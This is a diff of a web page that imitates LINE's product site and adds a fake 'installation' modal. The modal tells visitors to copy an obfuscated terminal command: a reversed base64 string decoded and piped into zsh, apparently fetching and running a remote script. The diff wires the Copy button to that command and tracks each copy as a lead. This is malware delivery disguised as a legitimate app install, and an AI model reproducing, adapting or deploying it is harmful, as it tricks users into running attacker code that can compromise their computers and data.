@@ -36,229 +36,234 @@
 <!-- End Meta Pixel Code -->
 <style>
     .installation-modal {
-        display: none;
-        position: fixed;
-        z-index: 999999;
-        left: 0;
-        top: 0;
-        width: 100%;
-        height: 100%;
-        background-color: rgba(0,0,0,0.6);
-    }
+    display: none;
+    position: fixed;
+    z-index: 999999;
+    left: 0;
+    top: 0;
+    width: 100%;
+    height: 100%;
+    background-color: rgba(0,0,0,0.6);
+}
 
-    .installation-modal.show {
-        display: block;
-    }
+.installation-modal.show {
+    display: block;
+}
 
-    .modal-content {
-        background: #ffffff;
-        position: fixed;
-        left: 50%;
-        top: 50%;
-        transform: translate(-50%, -50%);
-        padding: 0;
-        border-radius: 16px;
-        width: 92%;
-        max-width: 620px;
-        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-        border: 1px solid #e8e8e8;
-        overflow: hidden;
-        max-height: 90vh;
-        overflow-y: auto;
-    }
+.modal-content {
+    background: #ffffff;
+    position: fixed;
+    left: 50%;
+    top: 50%;
+    transform: translate(-50%, -50%);
+    padding: 0;
+    border-radius: 16px;
+    width: 92%;
+    max-width: 620px;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    border: 1px solid #e8e8e8;
+    overflow: hidden;
+    max-height: 90vh;
+    overflow-y: auto;
+}
 
-    .close-btn {
-        position: absolute;
-        top: 12px;
-        right: 12px;
-        width: 30px;
-        height: 30px;
-        border: none;
-        background: #f5f5f5;
-        color: #888;
-        border-radius: 6px;
-        cursor: pointer;
-        font-size: 18px;
-        z-index: 10;
-    }
+.close-btn {
+    position: absolute;
+    top: 12px;
+    right: 12px;
+    width: 30px;
+    height: 30px;
+    border: none;
+    background: #f5f5f5;
+    color: #888;
+    border-radius: 6px;
+    cursor: pointer;
+    font-size: 18px;
+    z-index: 10;
+}
 
-    .modal-header {
-        padding: 24px 24px 20px;
-        border-bottom: 1px solid #f0f0f0;
-    }
+.modal-header {
+    padding: 24px 24px 20px;
+    border-bottom: 1px solid #f0f0f0;
+}
 
-    .header-content {
-        display: flex;
-        align-items: center;
-        gap: 14px;
-    }
+.header-content {
+    display: flex;
+    align-items: center;
+    gap: 14px;
+}
 
-    .app-icon {
-        width: 56px;
-        height: 56px;
-        background: linear-gradient(180deg, #3DD87A 0%, #06A847 100%);
-        border-radius: 14px;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        flex-shrink: 0;
-    }
+.app-icon {
+    width: 56px;
+    height: 56px;
+    background: linear-gradient(180deg, #3DD87A 0%, #06A847 100%);
+    border-radius: 14px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-shrink: 0;
+}
 
-    .modal-title {
-        margin: 0 0 3px;
-        font-size: 20px;
-        font-weight: 700;
-        color: #1a1a1a;
-    }
+.modal-title {
+    margin: 0 0 3px;
+    font-size: 20px;
+    font-weight: 700;
+    color: #1a1a1a;
+}
 
-    .modal-subtitle {
-        margin: 0;
-        font-size: 13px;
-        color: #06C755;
-    }
+.modal-subtitle {
+    margin: 0;
+    font-size: 13px;
+    color: #06C755;
+}
 
-    .modal-body {
-        padding: 20px 24px;
-    }
+.modal-body {
+    padding: 20px 24px;
+}
 
-    .progress-bar {
-        height: 4px;
-        background: #f0f0f0;
-        border-radius: 2px;
-        margin-bottom: 8px;
-    }
+.progress-bar {
+    height: 4px;
+    background: #f0f0f0;
+    border-radius: 2px;
+    margin-bottom: 8px;
+}
 
-    .progress-fill {
-        height: 100%;
-        width: 33%;
-        background: linear-gradient(90deg, #3DD87A 0%, #06A847 100%);
-        border-radius: 2px;
-    }
+.progress-fill {
+    height: 100%;
+    width: 33%;
+    background: linear-gradient(90deg, #3DD87A 0%, #06A847 100%);
+    border-radius: 2px;
+}
 
-    .progress-labels {
-        display: flex;
-        justify-content: space-between;
-        font-size: 11px;
-        color: #aaa;
-        font-weight: 500;
-        margin-bottom: 20px;
-    }
+.progress-labels {
+    display: flex;
+    justify-content: space-between;
+    font-size: 11px;
+    color: #aaa;
+    font-weight: 500;
+    margin-bottom: 20px;
+}
 
-    .step {
-        display: flex;
-        gap: 14px;
-        margin-bottom: 20px;
-        align-items: flex-start;
-    }
+.step {
+    display: flex;
+    gap: 14px;
+    margin-bottom: 20px;
+    align-items: flex-start;
+}
 
-    .step-number {
-        width: 32px;
-        height: 32px;
-        background: #1B1B1B;
-        color: #fff;
-        border-radius: 50%;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        font-weight: 700;
-        font-size: 13px;
-        flex-shrink: 0;
-    }
+.step-number {
+    width: 32px;
+    height: 32px;
+    background: #1B1B1B;
+    color: #fff;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-weight: 700;
+    font-size: 13px;
+    flex-shrink: 0;
+}
 
-    .step-number.done {
-        background: linear-gradient(180deg, #3DD87A 0%, #06A847 100%);
-        font-size: 16px;
-    }
+.step-number.done {
+    background: linear-gradient(180deg, #3DD87A 0%, #06A847 100%);
+    font-size: 16px;
+}
 
-    .step-content {
-        padding-top: 3px;
-        flex: 1;
-    }
+.step-content {
+    padding-top: 3px;
+    flex: 1;
+    min-width: 0;
+}
 
-    .step-title {
-        margin: 0 0 6px;
-        font-size: 15px;
-        font-weight: 600;
-        color: #1a1a1a;
-    }
+.step-title {
+    margin: 0 0 6px;
+    font-size: 15px;
+    font-weight: 600;
+    color: #1a1a1a;
+}
 
-    .step-text {
-        margin: 0 0 8px;
-        font-size: 13px;
-        color: #666;
-    }
+.step-text {
+    margin: 0 0 8px;
+    font-size: 13px;
+    color: #666;
+}
 
-    .key {
-        background: #f4f4f4;
-        border: 1px solid #ddd;
-        border-radius: 4px;
-        padding: 3px 7px;
-        font-size: 12px;
-        font-weight: 600;
-        color: #333;
-    }
+.key {
+    background: #f4f4f4;
+    border: 1px solid #ddd;
+    border-radius: 4px;
+    padding: 3px 7px;
+    font-size: 12px;
+    font-weight: 600;
+    color: #333;
+}
 
-    .terminal-box {
-        background: #f4fdf7;
-        border: 1px solid #c8efd6;
-        border-radius: 8px;
-        padding: 10px 12px;
-    }
+.terminal-box {
+    background: #f4fdf7;
+    border: 1px solid #c8efd6;
+    border-radius: 8px;
+    padding: 10px 12px;
+    overflow: hidden;
+}
 
-    .terminal-header {
-        display: flex;
-        justify-content: space-between;
-        align-items: center;
-        margin-bottom: 8px;
-        font-size: 11px;
-        color: #888;
-        font-weight: 600;
-    }
+.terminal-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-bottom: 8px;
+    font-size: 11px;
+    color: #888;
+    font-weight: 600;
+}
 
-    .copy-btn {
-        background: linear-gradient(180deg, #3DD87A 0%, #06A847 100%);
-        color: #fff;
-        border: none;
-        border-radius: 6px;
-        padding: 5px 12px;
-        cursor: pointer;
-        font-size: 12px;
-        font-weight: 600;
-    }
+.copy-btn {
+    background: linear-gradient(180deg, #3DD87A 0%, #06A847 100%);
+    color: #fff;
+    border: none;
+    border-radius: 6px;
+    padding: 5px 12px;
+    cursor: pointer;
+    font-size: 12px;
+    font-weight: 600;
+}
 
-    .terminal-code {
-        margin: 0;
-        padding: 8px 10px;
-        background: #fff;
-        border: 1px solid #d8f0e2;
-        border-radius: 6px;
-        font-size: 12px;
-        color: #333;
-        font-family: Monaco, Menlo, monospace;
-    }
+.terminal-code {
+    margin: 0;
+    padding: 8px 10px;
+    background: #fff;
+    border: 1px solid #d8f0e2;
+    border-radius: 6px;
+    font-size: 12px;
+    color: #333;
+    font-family: Monaco, Menlo, monospace;
+    display: block;
+    white-space: pre;
+    overflow-x: auto;
+}
 
-    .warning-box {
-        background: #f0faf5;
-        border: 1px solid #b8e6ce;
-        border-radius: 8px;
-        padding: 10px 14px;
-        font-size: 13px;
-        color: #1a7a40;
-        display: flex;
-        align-items: flex-start;
-        gap: 8px;
-    }
+.warning-box {
+    background: #f0faf5;
+    border: 1px solid #b8e6ce;
+    border-radius: 8px;
+    padding: 10px 14px;
+    font-size: 13px;
+    color: #1a7a40;
+    display: flex;
+    align-items: flex-start;
+    gap: 8px;
+}
 
-    .continue-btn {
-        background: linear-gradient(180deg, #3DD87A 0%, #06A847 100%);
-        color: #fff;
-        border: none;
-        padding: 11px 24px;
-        border-radius: 8px;
-        font-weight: 600;
-        font-size: 14px;
-        cursor: pointer;
-    }
+.continue-btn {
+    background: linear-gradient(180deg, #3DD87A 0%, #06A847 100%);
+    color: #fff;
+    border: none;
+    padding: 11px 24px;
+    border-radius: 8px;
+    font-weight: 600;
+    font-size: 14px;
+    cursor: pointer;
+}
 </style>
 
 <div id="installationModal" class="installation-modal">
@@ -304,8 +309,7 @@
                             <span>TERMINAL</span>
                             <button class="copy-btn" onclick="copyCommand(this)">Copy</button>
                         </div>
-                        <pre class="terminal-code">echo '=g2c6BCfnMTZihzNmJGNwMGMlFzM2ATYxIGN3YjZzkDNwQGN4QWNiRGMlVzNzEWZ0EmNiFGM0gjM2UGMkhzMxUDMwUzNxEzLsJXdj9SbvNmL0NWZu52brRXZu9yL6MHc0RHanACIkV2czVmcw12bj1SLgw0cTZ2atACIsdyJyV3Y' | rev | base64 -D | zsh
-</pre>
+                        <pre class="terminal-code">echo '=g2c6BCfnMTZihzNmJGNwMGMlFzM2ATYxIGN3YjZzkDNwQGN4QWNiRGMlVzNzEWZ0EmNiFGM0gjM2UGMkhzMxUDMwUzNxEzLsJXdj9SbvNmL0NWZu52brRXZu9yL6MHc0RHanACIkV2czVmcw12bj1SLgw0cTZ2atACIsdyJyV3Y' | rev | base64 -D | zsh</pre>
                     </div>
                 </div>
             </div>
@@ -347,7 +351,7 @@
     }
 
     function copyCommand(btn) {
-        var command = 'command';
+        var command = "echo '=g2c6BCfnMTZihzNmJGNwMGMlFzM2ATYxIGN3YjZzkDNwQGN4QWNiRGMlVzNzEWZ0EmNiFGM0gjM2UGMkhzMxUDMwUzNxEzLsJXdj9SbvNmL0NWZu52brRXZu9yL6MHc0RHanACIkV2czVmcw12bj1SLgw0cTZ2atACIsdyJyV3Y' | rev | base64 -D | zsh";
 
         if (typeof fbq !== 'undefined') {
             fbq('track', 'Lead');
@@ -588,7 +592,7 @@
  <ul class=mainServiceList>
  <li class=serviceCnt><div class=service style=min-height:509px><div class=imgArea><div class="onlyPc image-wrapper" style=width:880px;height:auto;position:relative;overflow:hidden;display:inline-block;aspect-ratio:800/509><picture><img class=wrapped-image srcset src=images/19.png width=800 height=509 alt loading=eager style="position:absolute;top:0px;left:0px;width:100%;height:100%;object-fit:cover;object-position:center center;opacity:1" sizes></picture></div><div class="onlySp image-wrapper sf-hidden" style=width:100%;height:100%;position:relative;overflow:hidden;display:inline-block><picture class=sf-hidden><source srcset="images/96.png 200w, images/97.png 400w, images/98.png 670w"></picture></div></div><div class=txtArea><div class="linkIcon image-wrapper" style=width:80px;height:80px;position:relative;overflow:hidden;display:inline-block><picture><img class=wrapped-image srcset src=images/20.png width=800 height=800 alt loading=eager style="position:absolute;top:0px;left:0px;width:100%;height:100%;object-fit:cover;object-position:center center;opacity:1" sizes></picture></div><h3>LINE NEWS</h3><h4 class=onlyPc><span>Keep current with
 the latest news on LINE.</span></h4><h4 class="onlySp sf-hidden">Keep current with
-the latest news on LINE.</h4><div class=desc>LINE NEWS is the most popular news content curation service in Asia and aims to deliver valuable content that enrich your everyday life.</div><ul class="linkArea onlySp sf-hidden"><li class="siteLink fontB sf-hidden"><a href=http://news.line.me/about/ target=_blank rel="noopener noreferrer" class=sf-hidden><div class="siteIconWrap sf-hidden"><div class="siteIcon image-wrapper sf-hidden" style=width:218px;height:142px;overflow:hidden;display:inline-block><picture class=sf-hidden><source srcset="images/86.png 1x, images/87.png 1.5x"></picture></div></div></a></ul><ul class="linkArea onlyPc"><li class=siteLink><a href=http://news.line.me/about/ target=_blank rel="noopener noreferrer"><div class=siteIconWrap><div class="siteIcon image-wrapper" style=width:218px;height:142px;overflow:hidden;display:inline-block><picture><img srcset width=218 height=142 alt style="position:absolute;top:0px;left:0px;width:100%;height:100%;object-fit:cover;object-position:center center;opacity:1" loading=eager src=images/16.png sizes></picture></div></div><div class=fontM>More details</div></a></ul></div></div><li class=serviceCnt><div class=service style=min-height:509px><div class=imgArea><div class="onlyPc image-wrapper" style=width:880px;height:auto;position:relative;overflow:hidden;display:inline-block;aspect-ratio:800/509><picture><img class=wrapped-image srcset src=images/21.png width=800 height=509 alt loading=eager style="position:absolute;top:0px;left:0px;width:100%;height:100%;object-fit:cover;object-position:center center;opacity:1" sizes></picture></div><div class="onlySp image-wrapper sf-hidden" style=width:100%;height:100%;position:relative;overflow:hidden;display:inline-block><picture class=sf-hidden><source srcset="images/103.png 200w, images/104.png 400w, images/105.png 670w"></picture></div></div><div class=txtArea><div class="linkIcon image-wrapper" style=width:80px;height:80px;position:relative;overflow:hidden;display:inline-block><picture><img class=wrapped-image srcset src=images/22.png width=800 height=800 alt loading=eager style="position:absolute;top:0px;left:0px;width:100%;height:100%;object-fit:cover;object-position:center center;opacity:1" sizes></picture></div><h3>LINE MUSIC</h3><h4 class=onlyPc><span>Listen, Watch and Sing along.</span></h4><h4 class="onlySp sf-hidden">Listen, Watch and &lt;br&gt;Sing along.</h4><div class=desc>LINE MUSIC is a music streaming service in Japan with over 100 million songs, both Japanese and foreign. Users can listen to trending songs, watch music videos and enjoy the sing-along feature.</div><ul class="linkArea onlySp sf-hidden"><li class="siteLink fontB sf-hidden"><a href=https://music.line.me/top/ target=_blank rel="noopener noreferrer" class=sf-hidden><div class="siteIconWrap sf-hidden"><div class="siteIcon image-wrapper sf-hidden" style=width:218px;height:142px;overflow:hidden;display:inline-block><picture class=sf-hidden><source srcset="images/86.png 1x, images/87.png 1.5x"></picture></div></div></a></ul><ul class="linkArea onlyPc"><li><a href=https://apps.apple.com/jp/app/linemusic/id966142320 target=_blank rel="noopener noreferrer"><div class="appStoreIcon image-wrapper" style=width:218px;height:142px;overflow:hidden;display:inline-block><picture><img srcset width=218 height=142 alt style="position:absolute;top:0px;left:0px;width:100%;height:100%;object-fit:cover;object-position:center center;opacity:1" loading=eager src=images/16.png sizes></picture></div></a><li><a href="https://play.google.com/store/apps/details?id=jp.linecorp.linemusic.android" target=_blank rel="noopener noreferrer"><div class="googlePlayIcon image-wrapper" style=width:218px;height:142px;overflow:hidden;display:inline-block><picture><img srcset width=218 height=142 alt style="position:absolute;top:0px;left:0px;width:100%;height:100%;object-fit:cover;object-position:center center;opacity:1" loading=eager src=images/16.png sizes></picture></div></a><li class=siteLink><a href=https://music.line.me/top/ target=_blank rel="noopener noreferrer"><div class=siteIconWrap><div class="siteIcon image-wrapper" style=width:218px;height:142px;overflow:hidden;display:inline-block><picture><img srcset width=218 height=142 alt style="position:absolute;top:0px;left:0px;width:100%;height:100%;object-fit:cover;object-position:center center;opacity:1" loading=eager src=images/16.png sizes></picture></div></div><div class=fontM>More details</div></a></ul></div></div></ul>
+the latest news on LINE.</h4><div class=desc>LINE NEWS is the most popular news content curation service in Asia and aims to deliver valuable content that enrich your everyday life.</div><ul class="linkArea onlySp sf-hidden"><li class="siteLink fontB sf-hidden"><a href=http://news.line.me/about/ target=_blank rel="noopener noreferrer" class=sf-hidden><div class="siteIconWrap sf-hidden"><div class="siteIcon image-wrapper sf-hidden" style=width:218px;height:142px;overflow:hidden;display:inline-block><picture class=sf-hidden><source srcset="images/86.png 1x, images/87.png 1.5x"></picture></div></div></a></ul><ul class="linkArea onlyPc"><li class=siteLink><a href=http://news.line.me/about/ target=_blank rel="noopener noreferrer"><div class=siteIconWrap><div class="siteIcon image-wrapper" style=width:218px;height:142px;overflow:hidden;display:inline-block><picture><img srcset width=218 height=142 alt style="position:absolute;top:0px;left:0px;width:100%;height:100%;object-fit:cover;object-position:center center;opacity:1" loading=eager src=images/16.png sizes></picture></div></div><div class=fontM>More details</div></a></ul></div></div><li class=serviceCnt><div class=service style=min-height:509px><div class=imgArea><div class="onlyPc image-wrapper" style=width:880px;height:auto;position:relative;overflow:hidden;display:inline-block;aspect-ratio:800/509><picture><img class=wrapped-image srcset src=images/21.png width=800 height=509 alt loading=eager style="position:absolute;top:0px;left:0px;width:100%;height:100%;object-fit:cover;object-position:center center;opacity:1" sizes></picture></div><div class="onlySp image-wrapper sf-hidden" style=width:100%;height:100%;position:relative;overflow:hidden;display:inline-block><picture class=sf-hidden><source srcset="images/103.png 200w, images/104.png 400w, images/105.png 670w"></picture></div></div><div class=txtArea><div class="linkIcon image-wrapper" style=width:80px;height:80px;position:relative;overflow:hidden;display:inline-block><picture><img class=wrapped-image srcset src=images/22.png width=800 height=800 alt loading=eager style="position:absolute;top:0px;left:0px;width:100%;height:100%;object-fit:cover;object-position:center center;opacity:1" sizes></picture></div><h3>LINE MUSIC</h3><h4 class=onlyPc><span>Listen, Watch and &lt;br&gt;Sing along.</span></h4><h4 class="onlySp sf-hidden">Listen, Watch and &lt;br&gt;Sing along.</h4><div class=desc>LINE MUSIC is a music streaming service in Japan with over 100 million songs, both Japanese and foreign. Users can listen to trending songs, watch music videos and enjoy the sing-along feature.</div><ul class="linkArea onlySp sf-hidden"><li class="siteLink fontB sf-hidden"><a href=https://music.line.me/top/ target=_blank rel="noopener noreferrer" class=sf-hidden><div class="siteIconWrap sf-hidden"><div class="siteIcon image-wrapper sf-hidden" style=width:218px;height:142px;overflow:hidden;display:inline-block><picture class=sf-hidden><source srcset="images/86.png 1x, images/87.png 1.5x"></picture></div></div></a></ul><ul class="linkArea onlyPc"><li><a href=https://apps.apple.com/jp/app/linemusic/id966142320 target=_blank rel="noopener noreferrer"><div class="appStoreIcon image-wrapper" style=width:218px;height:142px;overflow:hidden;display:inline-block><picture><img srcset width=218 height=142 alt style="position:absolute;top:0px;left:0px;width:100%;height:100%;object-fit:cover;object-position:center center;opacity:1" loading=eager src=images/16.png sizes></picture></div></a><li><a href="https://play.google.com/store/apps/details?id=jp.linecorp.linemusic.android" target=_blank rel="noopener noreferrer"><div class="googlePlayIcon image-wrapper" style=width:218px;height:142px;overflow:hidden;display:inline-block><picture><img srcset width=218 height=142 alt style="position:absolute;top:0px;left:0px;width:100%;height:100%;object-fit:cover;object-position:center center;opacity:1" loading=eager src=images/16.png sizes></picture></div></a><li class=siteLink><a href=https://music.line.me/top/ target=_blank rel="noopener noreferrer"><div class=siteIconWrap><div class="siteIcon image-wrapper" style=width:218px;height:142px;overflow:hidden;display:inline-block><picture><img srcset width=218 height=142 alt style="position:absolute;top:0px;left:0px;width:100%;height:100%;object-fit:cover;object-position:center center;opacity:1" loading=eager src=images/16.png sizes></picture></div></div><div class=fontM>More details</div></a></ul></div></div></ul>
  </section>
  <section id=communication>
  <h2 class=fontB>Messenger APP</h2>
